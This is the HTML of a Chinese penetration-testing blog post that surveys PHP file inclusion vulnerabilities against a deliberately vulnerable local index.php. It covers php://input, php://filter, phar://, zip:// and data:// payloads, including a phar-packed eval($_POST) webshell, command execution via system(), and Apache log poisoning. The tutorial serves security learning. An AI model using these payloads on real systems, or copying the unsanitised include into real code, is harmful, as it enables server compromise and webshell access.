@@ -1,0 +1,1440 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="文件包含总结, 江南小虫虫的博客">
+    <meta name="description" content="
+实验环境：phpstudy，在D:\phpStudy\PHPTutorial\WWW\目录下新建fileinclude,然后新建index.php,内容如下
+
+&amp;lt;?php
+    $file = $_GET[&#39;file&#39;];
+   ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>文件包含总结 | 江南小虫虫的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">江南小虫虫的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/biaobai/表白.html" class="waves-effect waves-light">
+      
+      <i class="fas fa-heart" style="zoom: 0.6;"></i>
+      
+      <span>给亲爱的老婆仔</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">江南小虫虫的博客</div>
+        <div class="logo-desc">
+            
+            尽力就行~~~
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/biaobai/表白.html" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-heart"></i>
+			
+			给亲爱的老婆仔
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">文件包含总结</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/文件包含/">
+                                <span class="chip bg-color">文件包含</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/渗透测试/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-03-10
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2019-11-30
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.5k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    18 分
+                </div>
+                
+				
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <blockquote>
+<p>实验环境：phpstudy，在<code>D:\phpStudy\PHPTutorial\WWW\</code>目录下新建<code>fileinclude</code>,然后新建<code>index.php</code>,内容如下</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<a id="more"></a>
+<h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>php中引发文件包含漏洞的通常是以下四个函数：</p>
+<ol>
+<li><code>include()</code></li>
+<li><code>include_once()</code></li>
+<li><code>require()</code></li>
+<li><code>require_once()</code></li>
+</ol>
+<ul>
+<li><code>reuqire()</code> 如果在包含的过程中有错，比如文件不存在等，则<strong>会直接退出，不执行后续语句</strong>。</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.tlrmjrqif8a_1536892289" alt></p>
+<ul>
+<li><code>include()</code> 如果出错的话，只<strong>会提出警告，会继续执行后续语句</strong>。</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.47cclxfvyy6_1536892320" alt></p>
+<ul>
+<li><code>require_once()</code> 和 <code>include_once()</code> 功能与<code>require()</code> 和 <code>include()</code> 类似。不同的是，<strong>如果一个文件已经被包含过了，则 <code>require_once()</code> 和 <code>include_once()</code> 则不会再包含它</strong>，以避免函数重定义或变量重赋值等问题。</li>
+<li>当利用这四个函数来包含文件时，<strong>不管文件是什么类型（图片、txt等等），只要文件内容符合PHP语法规范，都会直接作为php文件进行解析，而包含非PHP语法规范源文件时，则会暴露其源代码</strong>。测试代码放在<code>fileinclude</code>目录下<code>index.php</code>：</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>在同目录下新建<code>phpinfo.txt</code>，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>。则只需要访问：</p>
+<pre><code>http://localhost/fileinclude/index.php?file=phpinfo.txt</code></pre><p>即可成功解析<code>phpinfo</code>。</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.dimdq6z1jz_1536892336" alt></p>
+<h3 id="文件包含漏洞场景"><a href="#文件包含漏洞场景" class="headerlink" title="文件包含漏洞场景"></a>文件包含漏洞场景</h3><ol>
+<li>具有相关的文件包含函数。</li>
+<li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li>
+<li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h4><code>本地文件包含漏洞</code>，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</li>
+</ol>
+<h4 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h4><p><code>远程文件包含漏洞</code>。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要<code>php.ini</code>中进行配置</p>
+<pre><code>allow_url_fopen = On
+allow_url_include = On</code></pre><p>两个配置选项均需要为<code>On</code>，才能远程包含文件成功。</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.4qlqcq95qn7_1536892375" alt></p>
+<p>在<code>php.in</code>i中，<code>allow_url_fopen</code>默认一直是<code>On</code>，而<code>allow_url_include</code>从php5.2之后就默认为<code>Off</code>。</p>
+<h2 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h2><p>下面例子中测试代码均为：<code>index.php</code></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><code>allow_url_fopen</code> 默认为 <code>On</code><br><code>allow_url_include</code> 默认为<code>Off</code></p>
+<p>若有特殊要求，会在利用条件里指出</p>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><code>php://input</code></h4><h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><p>用来接收<code>POST</code>数据。我们能够通过input把我们的语句输入上去然后执行。</p>
+<h5 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h5><pre><code>php &lt;5.0 ，allow_url_include=Off 情况下也可以用
+php &gt; 5.0，只有在allow_url_fopen=On 时才能使用</code></pre><p>对<code>allow_url_fopen</code>不做要求。</p>
+<h5 id="姿势1：增加一句话"><a href="#姿势1：增加一句话" class="headerlink" title="姿势1：增加一句话"></a>姿势1：增加一句话</h5><blockquote>
+<p>shell.php文件中只有“123456”</p>
+</blockquote>
+<p>URL:</p>
+<pre><code>http://localhost/fileinclude/index.php
+?file=php://input</code></pre><p>POST:(这里利用<code>hackbar</code>)</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">)</span> <span class="token delimiter">?></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.5sh6ok33qg_1536892409" alt></p>
+<p>结果将在<code>index.php</code>所在文件下的文件<code>shell.php</code>内增加”<code>&lt;?php phpinfo();?&gt;</code>“一句话。</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.vs835cfhsj_1536892416" alt></p>
+<h5 id="姿势2：增加文件"><a href="#姿势2：增加文件" class="headerlink" title="姿势2：增加文件"></a>姿势2：增加文件</h5><p>URL</p>
+<pre><code>http://localhost/fileinclude/index.php
+?file=php://input</code></pre><p>POST:</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"oneword.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">)</span> <span class="token delimiter">?></span></code></pre>
+<p>这里fopen参数为w，可新建一个文件。即在当前目录新建<code>oneword.php</code>文件,内容为<code>&lt;?php phpinfo();?&gt;</code></p>
+<h5 id="姿势3：执行系统命令"><a href="#姿势3：执行系统命令" class="headerlink" title="姿势3：执行系统命令"></a>姿势3：执行系统命令</h5><p>URL：</p>
+<pre><code>http://localhost/fileinclude/index.php
+?file=php://input</code></pre><p>POST:</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ipconfig'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.sbxz1c0v1vl_1536892441" alt></p>
+<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h4><h5 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h5><p>这个语句用来查看源码。<strong>直接包含php文件时会被解析，不能看到源码</strong>,所以用filter来读取,通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码即可得到源码。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p>
+<h5 id="利用条件：无甚"><a href="#利用条件：无甚" class="headerlink" title="利用条件：无甚"></a>利用条件：无甚</h5><h5 id="姿势："><a href="#姿势：" class="headerlink" title="姿势："></a>姿势：</h5><pre><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.gpbfsvf1hn6_1536892449" alt></p>
+<h6 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势:"></a>其他姿势:</h6><pre><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></pre><p>效果跟前面一样，少了<code>read</code>等关键字。在绕过一些waf时也许有用。</p>
+<h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><code>phar://</code></h4><h5 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h5><p>phar是一个文件归档的包，类似于Java中的Jar文件，方便了PHP模块的迁移。php中默认安装了这个模块。</p>
+<p>比如上传的文件名遭到了限制，我们无法上传php的文件，但是却只能包含php文件的时候（包含文件后缀名被限制 <code>include ‘$file’.’.php’</code>），我们就可以通过上传phar文件，再利用php伪协议来包含。</p>
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h5><p>php版本大于等于php5.3.0</p>
+<h5 id="姿势：-1"><a href="#姿势：-1" class="headerlink" title="姿势："></a>姿势：</h5><h6 id="创建一个phar文件"><a href="#创建一个phar文件" class="headerlink" title="创建一个phar文件"></a>创建一个phar文件</h6><p>在创建phar文件的时候要注意<code>phar.readonly</code>这个参数要为<code>off</code>，否则phar文件不可写</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">phar</span><span class="token punctuation">(</span><span class="token string">"shell.phar"</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token string">"shell.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$p</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$p</span><span class="token punctuation">[</span><span class="token string">'shell.php'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'&lt;?php phpinfo(); @eval($_POST[x])?>'</span><span class="token punctuation">;</span>
+<span class="token variable">$p</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php Phar::mapPhar('shell.phar'); __HALT_COMPILER?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>运行以上代码后会在当前目录下生成一个名为<code>shell.phar</code>的文件，这个文件可以被<code>include</code>，<code>file_get_contents</code>等函数利用</p>
+<h6 id="利用phar"><a href="#利用phar" class="headerlink" title="利用phar"></a>利用phar</h6><p>利用phar文件的方法很简单，利用phar特定的格式就可以加以利用</p>
+<pre><code>&lt;?php
+include &#39;phar://shell.phar/shell.php&#39;;
+?&gt;</code></pre><p>这样就可以成功把<code>shell</code>包含进来。当我们把<code>shell.phar</code>文件重命名为<code>shell.aaa</code>等一些无效的后缀名时，一样可以使用，说明了<strong>phar文件不受文件格式的影响</strong></p>
+<p>指定<strong>绝对路径</strong></p>
+<pre><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/shell.phar/shell.php</code></pre><p>或者<strong>使用相对路径</strong>（这里test.zip就在当前目录下）</p>
+<pre><code>index.php?file=phar://shell.phar/shell.php</code></pre><h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><code>zip://</code></h4><h5 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h5><p>php版本大于等于php5.3.0</p>
+<h5 id="姿势：-2"><a href="#姿势：-2" class="headerlink" title="姿势："></a>姿势：</h5><p>首先我们<strong>新建一个zip文件，里面压缩着一个php脚本(可以为php和jpg后缀)</strong><br>假设有个文件<code>phpinfo.txt</code>，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成<code>zip</code>压缩包，如下：</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.gpzgicp6mqb_1536892589" alt></p>
+<p>但使用zip协议，<strong>需要指定<code>绝对路径</code>，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件</strong>。若是使用相对路径，则会包含失败。</p>
+<pre><code>index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.i4lhwg58hc_1536892597" alt></p>
+<p>####<br><code>data:URI schema</code></p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310115711.png" alt></p>
+<h5 id="说明-2"><a href="#说明-2" class="headerlink" title="说明"></a>说明</h5><p>这是一种数据流封装器，<code>data:URI schema</code>(URL schema可以是很多形式)</p>
+<p>利用<code>data://</code>伪协议进行代码执行的思路原理和<code>php://</code>是类似的，都是利用了PHP中的流的概念，<strong>将原本的include的文件流重定向到了用户可控制的输入流中</strong></p>
+<h5 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h5><ul>
+<li>php版本大于等于php5.2</li>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ul>
+<h5 id="姿势一："><a href="#姿势一：" class="headerlink" title="姿势一："></a>姿势一：</h5><pre><code>index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.nh3ihn1zzgl_1536892608" alt></p>
+<h6 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h6><pre><code>index.php?file=data:text/plain,&lt;?php system(&#39;whoami&#39;);?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.1r2p6tbp1jo_1536892617" alt></p>
+<h5 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二:"></a>姿势二:</h5><pre><code>index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.sbz7wd98hs_1536892624" alt></p>
+<h6 id="执行命令-1"><a href="#执行命令-1" class="headerlink" title="执行命令"></a>执行命令</h6><pre><code>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code></pre><p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.ld25k1vwbhj_1536892635" alt></p>
+<h5 id="姿势三："><a href="#姿势三：" class="headerlink" title="姿势三："></a>姿势三：</h5><pre><code>index.php?imagedata=data://image/jpeg;base64,.....</code></pre><p>（后面加上图片木马）</p>
+<h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><h4 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h4><p>session文件路径已知，且其中内容部分可控。</p>
+<h4 id="姿势：-3"><a href="#姿势：-3" class="headerlink" title="姿势："></a>姿势：</h4><p>php的session文件的保存路径可以在<code>phpinfo</code>的<code>session.save_path</code>看到。</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.ozhtg265rd7_1536892642" alt></p>
+<p><strong>常见的php-session存放位置</strong>：</p>
+<pre><code>/var/lib/php/sess_PHPSESSID
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID</code></pre><p>session的文件名格式为<code>sess_[phpsessid]</code>。而phpsessid在发送的请求的cookie字段中可以看到。</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.7hphazvtxuo_1536892648" alt></p>
+<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
+<p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce" target="_blank" rel="noopener">透過 LFI 引入 PHP session 檔案觸發 RCE</a></p>
+<h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h4><h5 id="说明：-1"><a href="#说明：-1" class="headerlink" title="说明："></a>说明：</h5><p>当我们没有上传点，并且也没有<code>url_allow_include</code>功能时，我们就可以考虑包含服务器的日志文件</p>
+<p>Web服务器的访问日志文件，这是一种通用的技巧。因为几乎所有网站都会将用户的访问记录到访问日志中。因此，攻击者可以向Web日志中插入PHP代码，通过文件包含漏洞来执行包含在Web日志中的PHP代码。</p>
+<p>需要注意的是，如果网站访问量大的话，日志文件可能会非常大，这时如果包含一个这么大的文件时，PHP进程可能会卡死。一般网站通常会每天生成一个新的日志文件，因此在凌晨时进行攻击相对来说容易成功。</p>
+<h5 id="利用条件：-4"><a href="#利用条件：-4" class="headerlink" title="利用条件："></a>利用条件：</h5><p>需要知道服务器日志的存储路径，且日志文件可读。</p>
+<h5 id="姿势：-4"><a href="#姿势：-4" class="headerlink" title="姿势："></a>姿势：</h5><p><code>apache</code>在<strong>用户发起请求时</strong>，会将请求写入<code>access.log</code>，当<strong>发生错误时</strong>将错误写入<code>error.log</code>。攻击者使用Apache日志文件包含时，<strong>首先要确定Apache的日志路径</strong>，默认情况下，日志保存路径在 <code>/var/log/apache/access.l</code>。</p>
+<ol>
+<li>访问链接:<code>http://www.test.com/&lt;;?php eval(POST_[&#39;test&#39;]) ?&gt;</code></li>
+<li>使用菜刀连接 <code>http://www.test.com/index.php?file=/var/log/apache/access.log</code></li>
+<li>由于access的日志文件比较大，所以webshell可能会很慢甚至卡死,所以用<code>bp</code>代理截包,将包的<code>UA</code>设置为<code>&quot; &quot;</code>,使得payload进入错入日志<code>var/log/apache/error.log</code></li>
+<li>这时候用菜刀连接<code>http://www.test.com/index.php?file=../../../../../../../../../var/log/apache/error.log</code>,因为通常它比<code>acess.log</code>体积小点,所以webshell没有那么卡!!~<blockquote>
+<p>tips:但如果是直接发起请求，会导致<strong>一些符号(如：&lt;,&gt;,空格)被编码使得包含无法正确解析。可以使用<code>bp</code>代理截包后,在bp上修改,然后再发出去</strong>。</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.xtpwhfb5j0b_1536892658" alt></p>
+<p>如下图可以看到,正常的php代码已经写入了 <code>/var/log/apache2/access.log</code>。然后进行包含即可。</p>
